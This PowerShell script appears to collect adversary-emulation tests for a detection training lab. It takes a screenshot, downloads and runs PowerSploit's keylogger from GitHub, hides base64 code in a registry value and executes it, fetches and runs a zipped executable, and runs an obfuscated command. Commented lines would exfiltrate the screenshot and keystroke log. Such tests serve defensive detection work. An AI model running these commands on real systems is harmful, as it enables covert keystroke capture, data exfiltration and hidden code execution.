# Windows Screen Capture (CopyFromScreen)
Add-Type -AssemblyName System.Windows.Forms
$screen = [Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphic = [Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
$bitmap.Save("C:\Users\studentadmin\Desktop\vs.png")

# Utilize PowerShell and external resource to capture keystrokes Payload Provided by PowerSploit
# Upon successful execution, Powershell will execute Get-Keystrokes.ps1 and output to key.log.
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1" -OutFile "$env:TEMP\Get-Keystrokes.ps1"

Set-Location $env:TEMP
.\Get-Keystrokes.ps1 
Get-Keystrokes -LogPath $env:TEMP\key.log 

# Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. 
# Upon successful execution, powershell will execute encoded command and read/write from the registry.
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))"

# Mimic execution of compressed executable. When successfully executed, calculator.exe will open.
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip" -OutFile "$env:temp\T1027.zip"
Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
cmd.exe c/ "`"$env:temp\temp_T1027.zip\T1027.exe`""

# This is an obfuscated PowerShell command which when executed prints "Hello, from PowerShell!". 
# Example is from the 2021 Threat Detection Report by Red Canary.
$cmDwhy =[TyPe]("{0}{1}" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f'nv','cO','ert')  ;  &("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&("{1}{2}{0}"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y'))."v`ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )

# Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email. 
# Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.
# Send-MailMessage -From test@corp.com -To test@corp.com -Subject 'T1027_Atomic_Test' -Attachments C:\Users\studentadmin\Desktop\vs.png -SmtpServer 127.0.0.1

#  Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP. 
# Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.
# Invoke-WebRequest -Uri  127.0.0.1 -Method POST -Body $env:TEMP\key.log